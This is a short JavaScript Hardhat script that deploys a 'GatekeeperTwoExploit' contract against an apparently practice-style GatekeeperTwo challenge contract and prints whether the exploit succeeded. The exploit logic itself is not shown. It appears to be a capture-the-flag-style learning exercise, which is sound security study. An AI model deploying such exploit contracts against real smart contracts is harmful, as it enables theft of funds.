// gatekeeperTwo.js - Exploits the GatekeeperTwo contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { gkTwoAddress, gkTwoAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const gkTwo = new ethers.Contract(gkTwoAddress, gkTwoAbi, provider);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("GatekeeperTwoExploit");
    console.log("Deploying and running exploit...");
    const exploiter = await Exploiter.deploy(gkTwo.address);
    await exploiter.deployed();
    console.log("Exploiter deployed to:", exploiter.address);

    // Check if we were successful
    const result = await exploiter.result();

    console.log("Exploit successful:", result);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });